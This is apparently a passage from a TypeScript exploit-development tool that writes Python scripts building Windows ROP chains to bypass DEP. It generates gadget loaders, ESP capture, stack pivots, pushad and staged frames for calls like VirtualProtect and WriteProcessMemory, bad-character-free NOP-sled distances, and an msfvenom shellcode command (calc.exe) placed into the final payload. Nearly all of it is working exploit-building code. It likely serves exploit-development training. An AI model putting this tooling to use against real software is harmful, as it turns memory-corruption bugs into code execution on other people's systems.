  const sledOps = (register: string, keep: string[]): { ops: Op[]; negated: boolean } | undefined => {
    const math = arithmetic(register, keep);
    if (!math) return undefined;
    const sendable = (negated: boolean): boolean => negated || badchars.indexOf(0) < 0;
    const pop: Op = { call: math.pop, values: [computed("0")], note: `${math.by} = the distance to the NOPs, patched below` };
    if (sendable(math.sub)) return { ops: [pop, { call: math.op, values: [] }], negated: math.sub };
    const flip = negateGadget(math.by, keep.concat(register));
    if (!flip) return undefined;
    return { ops: [pop, { call: entry(flip, `negate the distance`), values: [] }, { call: math.op, values: [] }], negated: !math.sub };
  };

  // The ops that leave a slot's value in `register`. Both styles use this one loader.
  const load = (slot: Slot, register: string, keep: string[]): Op[] => {
    const source = slot.source;
    // `_value` keeps the target a legal identifier: a slot called "return" would otherwise emit `return = ...`.
    const missing = (why: string): Op[] => hole(`${ident(slot.name)}_value`, why);
    const to = (goal: Val | undefined, why: string): Op[] => {
      if (!goal) return missing(why);
      const ops = reachOps(register, goal, keep, slot.name);
      return "missing" in ops ? missing(ops.missing) : ops;
    };
    switch (source.kind) {
      case "api":
        return to(goalOf(slot), "no IAT slot to read: see [2/7]");
      case "const":
        return to(constVal(source.value), "");
      case "copy":
        return to(frameGoal(slot, facts), `no executable cave of at least 0x${WPM_MIN_COPY.toString(16)} bytes in ${input.module}: dx @$osed().code_caves("", 0x${WPM_MIN_COPY.toString(16)}, 25, "${badSpaced}", "EXEC")`);
      case "named": {
        const value = source.name === "WRITABLE" ? input.writable : input.cave;
        return to(value === undefined ? undefined : constVal(value, source.name),
          `no clean ${source.name.toLowerCase()} address in ${input.module}: dx @$osed().code_caves("", ${source.name === "WRITABLE" ? "4" : "0x210"}, 25, "${badSpaced}", "${source.name === "WRITABLE" ? "STAGING" : "EXEC"}")`);
      }
      case "nops":
        return to(constVal(0x90909090), "");
      case "ropnop": {
        const ret = lone();
        return to(ret ? constVal(gadgetAddress(ret), ref(entry(ret, "ROP NOP"))) : undefined, `no lone ret in ${input.module}`);
      }
      case "jmpesp":
        return to(input.jmpEsp === undefined ? undefined : constVal(input.jmpEsp, ref(row(input.jmpEsp, "jmp esp", "return into the stack"))),
          `no jmp esp or call esp without bad bytes in ${input.module}: dx @$osed().find_bytes("${input.module}", "FF E4", 20)`);
      case "skip3": {
        const skip = skipper();
        return to(skip ? constVal(gadgetAddress(skip), ref(row(gadgetAddress(skip), sequence(skip), "skip three dwords"))) : undefined,
          `no gadget that skips three dwords, like add esp, 0xC ; ret: dx @$osed().add_esp("${input.module}")`);
      }
      case "size": {
        // The only value the search cannot own: the script picks it at run time, growing it until the
        // negative is clean, so there is no number here to test against the bad chars.
        const pop = popGadget(register, keep);
        if (!negate || negate.at.dest !== register || !pop) return missing(`no pop and neg for ${register}: the size is negated at run time, so it needs both in ${register}`);
        say(register, slot.name, "chosen at run time", `POP then NEG, the only load the search does not own: the script grows size until neg(size) is clean`, "popped negated, then negated back");
        return [
          { call: entry(pop, `load ${register}`, 1), values: [computed("neg(size)")], note: `${register} = neg(size), kept clean by the loop above` },
          { call: entry(negate.gadget, "negate"), values: [], note: `${register} = -${register}, now size` },
        ];
      }
      case "shellcode": {
        if (style === "staged") {
          // A staged frame holds constants but for this one dword: the shellcode is in the payload, so
          // its address is the captured ESP plus a distance only the laid-out chain knows. The capture
          // runs inside this loader, because `here` has to name the chain dword ESP will be pointing at
          // when it does, and the patched dword is the one popped straight after.
          if (!capture) return missing(`no gadget captures ESP in ${input.module}: see [4/7]`);
          const from = capture.at.dest ?? "";
          const route = [from, ...REGISTERS.filter((r) => r !== from && keep.indexOf(r) < 0)].map((at) => {
            const there = moveOps(from, at, keep);
            const sled = there ? sledOps(at, keep) : undefined;
            const back = sled ? moveOps(at, register, keep) : undefined;
            return there && sled && back ? { there, sled, back } : undefined;
          }).filter((found) => found !== undefined)[0];
          if (!route) {
            return missing(`no register takes the captured ESP out of ${from} and a distance onto it: the shellcode's address\n`
              + `is ESP plus a few hundred bytes, so this needs an add or a sub whose distance the chain can send, and\n`
              + `the chain can only send it negated while 00 is a bad char: dx @$osed().palette("${input.module}", "${badSpaced}")`);
          }
          sledSub = route.sled.negated;
          say(register, slot.name, "the captured ESP plus a distance", `capture ESP, then ${route.sled.negated ? "sub" : "add"} the distance the script patches below`,
            `the captured ESP plus the distance to the NOPs`);
          return [
            { line: `here = len(c) + 1 + c.skip // 4     # ${from} = the address of this chain dword` },
            { call: entry(capture.gadget, "capture ESP"), values: [] },
            ...route.there,
            { line: "c.patches.append((len(c) + 1 + c.skip // 4, here))" },
            ...route.sled.ops,
            ...route.back,
          ];
        }
        // The field address plus the distance to the sled, worked out in `register` itself or, when it has
        // no sub, in any register that has one and can hand the result over.
        const via = [register, ...REGISTERS.filter((r) => r !== register && keep.indexOf(r) < 0)].map((at) => {
          const math = arithmetic(at, keep);
          const there = math && (math.sub || badchars.indexOf(0) < 0) ? moveOps(field, at, keep) : undefined;
          const back = there ? moveOps(at, register, keep) : undefined;
          return math && there && back ? { math, there, back } : undefined;
        }).filter((found) => found !== undefined)[0];
        if (style === "skeleton" && via) {
          sledSub = via.math.sub;
          return [...via.there, { line: "c.patches.append((len(c) + 1 + c.skip // 4, field))" }, { call: via.math.pop, values: [computed("0")] }, { call: via.math.op, values: [] }, ...via.back];
        }
        const math = arithmetic(register, keep);
        const move = moveOps(field, register, keep);
        if (style !== "skeleton" || !math || !move) {
          return missing(style === "skeleton" ? `no gadget adds a popped distance to ${register}`
            : `the shellcode's address on the stack, so this dword needs a write before the pushad: bp ${pick("pushad") ? hex(gadgetAddress(pick("pushad")!.gadget)) : "<pushad gadget>"} ; g ; s -b esp L400${" 90".repeat(16)}`);
        }
        // The distance to the sled is a few hundred bytes, known only once the chain is laid out. Subtracted,
        // it is popped as 0xFFFFFExx; added, as 0x000001xx, which no target with 00 as a bad char accepts.
        if (!math.sub && badchars.indexOf(0) >= 0) return missing(`no sub into ${register}: the shellcode is a few hundred bytes up the stack, so an add would pop 00 bytes`);
        return [...move, { line: "c.patches.append((len(c) + 1 + c.skip // 4, field))" }, { call: math.pop, values: [computed("0")] }, { call: math.op, values: [] }];
      }
    }
  };

  // Whether the loaders subtract the distance to the sled or add it, which decides the sign to_sled pops.
  let sledSub: boolean | undefined;
  const loaders: Op[] = [];
  const defineLoader = (slot: Slot, register: string, keep: string[]): string => {
    const fn = `load_${ident(slot.name)}`;
    // A staged frame's shellcode slot needs no field number: its value is measured from the captured
    // ESP, not from the field it is written into.
    const params = slot.source.kind === "shellcode" && style !== "staged" ? "c, field"
      : slot.source.kind === "size" ? "c, size" : "c";
    loaders.push({ line: `def ${fn}(${params}):${" ".repeat(Math.max(1, 34 - fn.length - params.length))}# ${register} = ${slot.name}` });
    const holesBefore = holes.length;
    for (const op of load(slot, register, keep)) loaders.push("call" in op ? op : { line: op.line });
    // A load that never reached the search has no route of its own: the value it wanted was missing before
    // any gadget mattered. Saying that is what keeps the list even with the register map.
    if (said.indexOf(fn) < 0) {
      const why = holes.length > holesBefore ? holes[holesBefore].slice(holes[holesBefore].indexOf(": ") + 2) : "built from the frame, not searched for";
      say(register, slot.name, "no value to search for", `not searched: ${why}`, `not searched: ${why}`);
    }
    return fn;
  };

  let frameBlock: string[] = [];
  const chain: Op[] = [];
  if (style === "skeleton") {
    const frame = FRAMES[api];
    const literal = (slot: Slot): string | undefined => {
      const fixed = slot.source.kind === "copy" ? copyBytes(facts) : slot.source.kind === "const" ? slot.source.value : undefined;
      if (fixed !== undefined && isClean(fixed, badchars)) return hex(fixed);
      if (slot.source.kind !== "named") return undefined;
      const value = slot.source.name === "WRITABLE" ? input.writable : input.cave;
      return value !== undefined && isClean(value, badchars) ? slot.source.name : undefined;
    };
    // Each dword is patched by the chain before the call reads it, but the payload carries it first.
    const dummies = [0x45, 0x46, 0x47, 0x48, 0x49, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5a, 0x61, 0x62, 0x63]
      .filter((b) => badchars.indexOf(b) < 0 && b * 0x01010101 !== JUNK).map((b) => (b * 0x01010101) >>> 0);
    frameBlock = [
      ...frame.map((slot, i) => {
        const value = literal(slot) ?? hex(dummies[i]);
        return `frame ${i === 0 ? " =" : "+="} p32(${value})${" ".repeat(Math.max(1, 14 - value.length))}# ${slot.name}${literal(slot) ? "" : ", patched by the chain"}`;
      }),
      "FRAME_AT = OFFSET - len(frame)     # field 1 sits here, so the chain starts on EIP",
      retGap,
    ];
    const keepField: Op[] | undefined = copy && !copy.move ? [{ call: entry(copy.gadget, "keep the field address"), values: [] }]
      : !copy && copyPath ? copyPath.gadgets.map((gadget) => ({ call: entry(gadget, `move ${copyPath.from} into ${copyPath.to}`), values: [] })) : undefined;
    if (!capture || !keepField || !write || !pivot) {
      chain.push(...hole("payload", "[4/7] has no exact pick for capture, add, copy, write or pivot: write this chain and its payload by hand"));
    } else {
      const fns = frame.map((slot) => literal(slot) ? undefined : defineLoader(slot, valueRegister, [field]));
      chain.push(group("the captured ESP, and the address of field 1"));
      chain.push({ line: `# ${field} = field 1 - ${hex(writeOffset)}: the captured ESP is buffer offset OFFSET + 4 + RET_GAP, field 1 is FRAME_AT` });
      chain.push({ line: `# confirm: bp ${hex(gadgetAddress(capture.gadget))} ; g ; r esp ; s -d esp-400 L100 ${(dummies[0] >>> 0).toString(16)}` });
      chain.push({ call: entry(capture.gadget, "capture ESP"), values: [] });
      // The captured ESP is the buffer at OFFSET + 4 + RET_GAP and field 1 is FRAME_AT, len(frame) below
      // OFFSET, so the distance is known now and goes through the same search as any value.
      // Onto the captured ESP before the copy, or onto the copy when the captured register has no add.
      const distance = -(4 * frame.length + 4 + gap + writeOffset);
      const before = offsetBy(capture.at.dest ?? "", distance, [], "field 1", add?.gadget);
      const after = "missing" in before ? offsetBy(field, distance, [], "field 1", add?.gadget) : before;
      if (!("missing" in before)) chain.push(...before, ...keepField);
      else chain.push(...keepField, ...("missing" in after ? hole("distance", after.missing) : after));
      let at = 0;
      frame.forEach((slot, i) => {
        const fn = fns[i];
        if (!fn) return;
        // The header opens the group, so every line that builds this field is under it: the advance that
        // walks the pointer here, the load, and the write. A wrong field is one scroll, not a dword count.
        chain.push(group(`field ${i + 1}: ${slot.name}`));
        if (i > at) {
          const there = advance ? moveOps(field, advance.at.dest ?? field, []) : undefined;
          const back = advance ? moveOps(advance.at.dest ?? field, field, []) : undefined;
          if (!advance || !there || !back) chain.push(...hole("advance", `no inc gadget that reaches ${field}`));
          else chain.push(...there, { call: entry(advance.gadget, "advance the field address"), values: [], times: 4 * (i - at) }, ...back);
          at = i;
        }
        const args = slot.source.kind === "shellcode" ? `c, ${i + 1}` : slot.source.kind === "size" ? "c, size" : "c";
        if (briefs[fn]) chain.push({ line: `# ${briefs[fn]}` });
        chain.push({ line: `${fn}(${args})` });
        chain.push({ call: entry(write.gadget, "write the field"), values: [] });
      });
      const pops = popsAfterPivot(pivot.gadget);
      const delta = writeOffset - 4 * at - 4 * pops;
      // The pivot's register gets the field address plus the delta, worked out in whichever register has
      // an add or sub the search can feed and moves both ways.
      const target = pivot.at.source ?? "";
      const tried = [valueRegister, target, ...REGISTERS].filter((r, i, all) => all.indexOf(r) === i).map((at) => {
        const there = moveOps(field, at, []);
        const shift = there ? offsetBy(at, delta, [], "the pivot") : { missing: `no way to move the field address into ${at}` };
        const back = there && !("missing" in shift) ? moveOps(at, target, []) : undefined;
        return { there, shift, back };
      });
      const route = tried.find((t) => t.there && !("missing" in t.shift) && t.back);
      chain.push(group("pivot: ESP onto field 1"));
      chain.push({ line: `# ${target} = field 1 - ${hex(4 * pops)}, so the ret after the pivot lands on field 1` });
      if (route && !("missing" in route.shift)) chain.push(...route.there!, ...route.shift, ...route.back!);
      else {
        const why = tried.map((t) => (t.there && "missing" in t.shift ? t.shift.missing : undefined)).find((text) => text !== undefined);
        chain.push(...hole("pivot_value", why ?? `no way to move the field address into ${target}`));
      }
      chain.push({ call: entry(pivot.gadget, "pivot ESP onto field 1"), values: [] });
      const sub = sledSub ?? arithmetic(valueRegister, [field])?.sub !== false;
      chain.push(
        { line: "" },
        group("the shellcode address, into the fields the loaders marked"),
        { line: "chain_end = OFFSET + 4 * len(c)" },
        { line: `def to_sled(field, gap):        # what the pop before the ${sub ? "sub" : "add"} needs, so the value lands on the NOPs` },
        { line: `    distance = chain_end + gap - (FRAME_AT + 4 * (field - 1)${writeOffset ? ` - ${hex(writeOffset)}` : ""})` },
        { line: `    return ${sub ? "neg(distance)" : "distance"}` },
        { line: "gap = 0x40" },
        { line: "while not all(clean(to_sled(f, gap)) for _, f in c.patches):" },
        { line: "    gap += 1" },
        { line: "    if gap > 0x1000: hole(\"a distance to the sled that holds no bad char\")" },
        { line: "for at, f in c.patches: c[at] = to_sled(f, gap)" },
        { line: "" },
        { line: "payload  = PAD * FRAME_AT + frame + b\"\".join(p32(w) for w in c)" },
        { line: "payload += PAD * gap + nops + shellcode" },
      );
    }
  } else if (style === "staged") {
    // The frame is laid at a fixed writable address in the module, so the payload carries no frame at
    // all and every field's address is a constant the chain pops. Each field is one group: the value
    // into the write's value register keeping nothing, then that field's address into the write's
    // address register keeping the value, then the write. Nothing is carried from one field to the
    // next, which is why a module that cannot copy a register at all still takes this style.
    const frame = FRAMES[api];
    const staging = input.staging;
    const span = 4 * frame.length;
    const addrRegister = write?.at.address ?? "";
    frameBlock = staging === undefined ? [] : [
      `STAGING = ${hex(staging)}      # the frame is laid here: ${span} writable bytes in ${input.module}`,
      ...frame.map((slot, i) => `#   ${stagingText(4 * i).padEnd(22)}${slot.name}${i === 0 ? "   <- the pivot's ret enters the call here" : ""}`),
      retGap,
    ];
    if (staging === undefined || !write || !pivot) {
      chain.push(...hole("payload", staging === undefined
        ? `no run of ${span} writable bytes in ${input.module} with every field address free of the bad chars: the chain pops each one\ndx @$osed().code_caves("", ${hex(span)}, 25, "${badSpaced}", "STAGING")`
        : "[4/7] has no exact pick for write or pivot: write this chain and its payload by hand"));
    } else {
      const fns = frame.map((slot) => defineLoader(slot, valueRegister, []));
      // Keyed by the gadgets, so two fields that took the same route are seen to have taken it: the
      // names are per-call reference tokens and two of them differ even for one gadget.
      const addresses: Array<{ names: string[]; key: string }> = [];
      frame.forEach((slot, i) => {
        chain.push(group(`field ${i + 1}: ${slot.name}`));
        if (briefs[fns[i]]) chain.push({ line: `# ${briefs[fns[i]]}` });
        chain.push({ line: `${fns[i]}(${slot.source.kind === "size" ? "c, size" : "c"})` });
        const goal = constVal((staging + 4 * i - writeOffset) >>> 0, stagingText(4 * i - writeOffset));
        const found = reachPath(addrRegister, goal, [valueRegister]);
        if (!isPath(found)) chain.push(...hole(`field${i + 1}_address`, unreachable(addrRegister, goal, [valueRegister], `field ${i + 1}`, found).full));
        else {
          const walked = walk(addrRegister, goal, `field ${i + 1}`, found);
          addresses.push({ names: walked.names, key: found.hops.map((hop) => gadgetAddress(hop.gadget)).join() });
          chain.push(...walked.ops);
        }
        chain.push({ call: entry(write.gadget, "write the field"), values: [] });
      });
      // One route line for the whole set, not one per field: they differ only in the constant, and a
      // constant is what a staged frame's field addresses are. Each is searched separately all the same,
      // because a bad byte in one of them can cost it a gadget its neighbour did not need.
      if (addresses.length > 0) {
        const distinct = addresses.filter((entry, i) => addresses.findIndex((other) => other.key === entry.key) === i);
        const route = distinct.length === 1 ? `${distinct[0].names.join(" -> ")}, the same route for all ${addresses.length}`
          : distinct.map((entry) => entry.names.join(" -> ")).join(", or ");
        routes.push(`${addrRegister} = each field address: ${route}. ${frame.length} constants, ${stagingText(-writeOffset)} to ${stagingText(span - 4 - writeOffset)}`);
      }
      const pops = popsAfterPivot(pivot.gadget);
      const target = pivot.at.source ?? "";
      chain.push(group("pivot: ESP onto the frame"));
      chain.push({ line: `# ${target} = ${stagingText(-4 * pops)}, so the ret after the pivot lands on field 1` });
      const pivotOps = reachOps(target, constVal((staging - 4 * pops) >>> 0, stagingText(-4 * pops)), [], "the pivot");
      chain.push(..."missing" in pivotOps ? hole("pivot_value", pivotOps.missing) : pivotOps);
      chain.push({ call: entry(pivot.gadget, "pivot ESP onto the frame"), values: [] });
      chain.push(
        { line: "" },
        group("the shellcode address, into the slot the loader marked"),
        { line: `def to_sled(here, gap):        # what the pop before the ${sledSub ? "sub" : "add"} needs, so the value lands on the NOPs` },
        { line: "    distance = 4 * (len(c) - here) + gap" },
        { line: `    return ${sledSub ? "neg(distance)" : "distance"}` },
        { line: "gap = 0x40" },
        { line: "while not all(clean(to_sled(h, gap)) for _, h in c.patches):" },
        { line: "    gap += 1" },
        { line: "    if gap > 0x1000: hole(\"a distance to the sled that holds no bad char\")" },
        { line: "for at, h in c.patches: c[at] = to_sled(h, gap)" },
        { line: "" },
        { line: "payload  = PAD * OFFSET + b\"\".join(p32(w) for w in c)" },
        { line: "payload += PAD * gap + nops + shellcode" },
      );
    }
  } else {
    // Each loaded register is kept by every load after it, so a register blocked only by what the ones
    // before it hold is reachable if it goes first. Such a register moves to the front and the order is
    // tried again. A register the module cannot reach at all stays put: moving it buys nothing and would
    // reorder the frame for no gain, so the test is whether it reaches with nothing kept.
    let slots = PUSHAD_FRAMES[api].slice();
    for (let tries = 0; tries < slots.length; tries += 1) {
      const kept: string[] = [];
      const stuck = slots.find((slot) => {
        const register = slot.register ?? "eax";
        const goal = goalOf(slot);
        const blocked = goal !== undefined && kept.length > 0 && !isPath(reachPath(register, goal, kept)) && isPath(reachPath(register, goal, []));
        kept.push(register);
        return blocked;
      });
      if (!stuck) break;
      slots = [stuck, ...slots.filter((slot) => slot !== stuck)];
    }
    const loaded: string[] = [];
    const order = slots.map((slot) => {
      const fn = defineLoader(slot, slot.register ?? "eax", loaded.slice());
      loaded.push(slot.register ?? "eax");
      return fn;
    });
    frameBlock = [`PUSHAD_ORDER = [${order.join(", ")}]`, `# ${slots.map((slot) => `${slot.register} = ${slot.name}`).join(", ")}`, retGap];
    const dispatch = pick("pushad");
    chain.push(group("the seven registers, in the order [6/7] fixes"));
    // One line per register, so the [7/7] screenshot shows the route each one took without scrolling to
    // the loader that walks it. The loaders themselves carry what every gadget does to the registers.
    for (const fn of order) chain.push({ line: `# ${briefs[fn] ?? fn}` });
    chain.push({ line: "for load in PUSHAD_ORDER: load(c)" });
    chain.push(group("dispatch: pushad writes the whole frame at once"));
    if (dispatch && sequence(dispatch.gadget) !== "pushad ; ret") {
      chain.push({ line: `# ${input.module} has no clean pushad ; ret. This one is ${sequence(dispatch.gadget)}: everything after the pushad has to survive, or the chain dies before the ret.` });
    }
    if (dispatch) chain.push({ call: entry(dispatch.gadget, "pushad ; ret"), values: [] });
    else chain.push(...hole("dispatch", `no pushad ; ret in ${input.module}: dx @$osed().find_bytes("${input.module}", "60 C3", 20)`));
    const tail: string[] = [];
    for (const slot of PUSHAD_TAIL[api]) {
      const known = slot.source.kind === "named" && (slot.source.name === "WRITABLE" ? input.writable : input.cave) !== undefined;
      const fixed = slot.source.kind === "copy" ? copyBytes(facts) : slot.source.kind === "const" ? slot.source.value : undefined;
      if (fixed !== undefined && isClean(fixed, badchars)) tail.push(hex(fixed));
      else if (fixed !== undefined) {
        chain.push(...hole(`${ident(slot.name)}_value`, `${hex(fixed)} holds a bad byte and sits after the pushad gadget, where no gadget can build it`));
        tail.push(`${ident(slot.name)}_value`);
      }
      else if (slot.source.kind === "named" && known) tail.push(slot.source.name);
      else {
        chain.push(group(`${slot.name}: a dword after the pushad gadget, not a register`));
        chain.push(...load(slot, "eax", loaded));
        tail.push(`${ident(slot.name)}_value`);
      }
    }
    if (tail.length > 0) {
      chain.push(group("the dwords the call reads after the pushad gadget"));
      chain.push({ line: `c.extend([${tail.join(", ")}])` });
    }
    chain.push({ line: "" }, { line: "payload = PAD * OFFSET + b\"\".join(p32(w) for w in c) + nops + shellcode" });
  }

  assignNames(table);
  const resolve = (text: string): string => text.replace(/\u0001(\d+)\u0001/g, (_, i: string) => refs[Number(i)].name);
  // The one place a dword becomes chain text, so the bad char check cannot be skipped by a new constant:
  // a known value holding a bad byte is a hole that stops the file and names it, never a dword sent.
  const dword = (value: Dword): string => {
    if (value.k === undefined || isClean(value.k, badchars)) return resolve(value.text);
    const name = `${resolve(value.text)} = ${hex(value.k)}`;
    holes.push(`${name}: holds a bad byte, and no route here builds it`);
    return `hole(${JSON.stringify(name + " holds a bad byte")})`;
  };
  const render = (ops: Op[], indent: string): string[] => ops.map((op) => {
    if ("line" in op) return op.line === "" ? "" : `${indent}${resolve(op.line)}`;
    const call = `c.rop(${[op.call.name, ...op.values.map(dword)].join(", ")})`;
    const line = `${indent}${op.times && op.times > 1 ? `for _ in range(${op.times}): ${call}` : call}`;
    return op.note ? `${line}${" ".repeat(Math.max(2, 44 - line.length))}# ${resolve(op.note)}` : line;
  });
  const loaderLines = render(loaders, "    ").map((line) => line.indexOf("    def ") === 0 ? line.slice(4) : line);

  const width = Math.max(0, ...table.map((entry) => entry.name.length));
  const cost = table.filter((entry) => entry.pops > 0 || entry.retn > 0);
  const badText = badchars.map((b) => `\\x${b.toString(16).padStart(2, "0")}`).join("");
  // PUSHAD takes dwSize as a constant in a register; both styles that write the frame take it from the
  // script, which grows it until its negative holds no bad char.
  const sized = style !== "pushad" && FRAMES[api].some((slot) => slot.source.kind === "size");
  const slot = slotBlock(api, input.module, input.iatSlot, badchars, input.delta);
  const stageLines = [
    `def payload${nextStage()}():`,
    ...[
      "nops = b\"\\x90\" * 16",
      ...render(hole("shellcode", `msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -b "${badText}" -f python -v shellcode`), ""),
      ...(sized ? ["size = len(nops + shellcode)", "while not clean(neg(size)): size += 1"] : []),
      "c = Chain()",
      "c.skip = RET_GAP                 # junk after the first gadget for the bytes the crashing ret skips: [6/7]",
      ...render(chain, ""),
      "return sendable(payload)",
    ].map((line) => (line === "" ? "" : `    ${line}`)),
  ];
  return {
    table,
    stages,
    holes: slot.hole ? [slot.hole, ...holes] : holes,
    routes: routes.map(resolve),
    blocks: {
      1: HELPER_BLOCK,
      2: slot.block,
      3: CORPUS_BLOCK,
      4: { lines: [
        ...table.flatMap((entry) => [
          `${entry.name.padEnd(width)} = ${hex(entry.address)}   # ${entry.sequence}${warnings[entry.address] ? `   <<< ${warnings[entry.address]}`
            : byAddress[entry.address] && far(byAddress[entry.address]) ? `   <<< takes 0x${(stackMove(byAddress[entry.address]) ?? 0).toString(16)} bytes of stack: c.rop pads that much junk into the payload` : ""}`,
          ...swapsFor(entry.address, entry.loads).map((swap) =>
            `# ${entry.name.padEnd(width - 2)} = ${hex(swap.address)}   # ${swap.sequence}   drop-in swap, ranked lower: ${swap.why}`),
        ]),
        "# (the stack dwords each one takes, ret N). The swap-ins are here too, so swapping one in needs no other edit.",
        ...dictLines("COST", [
          ...cost.map((entry) => `${entry.name}: (${entry.pops}, ${entry.retn ? `0x${entry.retn.toString(16)}` : 0})`),
          ...table.flatMap((entry) => swapsFor(entry.address, entry.loads))
            .filter((swap, i, all) => (swap.pops > 0 || swap.retn > 0)
              && table.every((entry) => entry.address !== swap.address)
              && all.findIndex((other) => other.address === swap.address) === i)
            .map((swap) => `${hex(swap.address)}: (${swap.pops}, ${swap.retn ? `0x${swap.retn.toString(16)}` : 0})`),
        ]),
        `PAD = b"\\x${(JUNK & 0xff).toString(16).padStart(2, "0")}"                   # the byte the payload pads with, not a bad char`,
        "JUNK = int.from_bytes(PAD * 4, \"little\")   # and the junk dword made of it",
        "",
        "# c.rop(gadget, values): the gadget, junk for the last ret N, its values, junk for the dwords it pops past them",
        "class Chain(list):",
        "    skip, patches = 0, None",
        "    def rop(self, gadget, *values):",
        "        pops, retn = COST.get(gadget, (0, 0))",
        "        self.extend([gadget] + [JUNK] * (self.skip // 4) + list(values) + [JUNK] * max(0, pops - len(values)))",
        "        self.skip, self.patches = retn, self.patches or []",
      ] },
      5: { lines: [
        ...(input.writable !== undefined ? [`WRITABLE = ${hex(input.writable)}     # writable dword, code_caves STAGING`] : []),
        ...(input.cave !== undefined ? [`CAVE = ${hex(input.cave)}     # executable cave, code_caves EXEC`] : []),
        ...loaderLines,
      ] },
      6: { lines: frameBlock },
      7: { lines: stageLines },
    },
  };
}
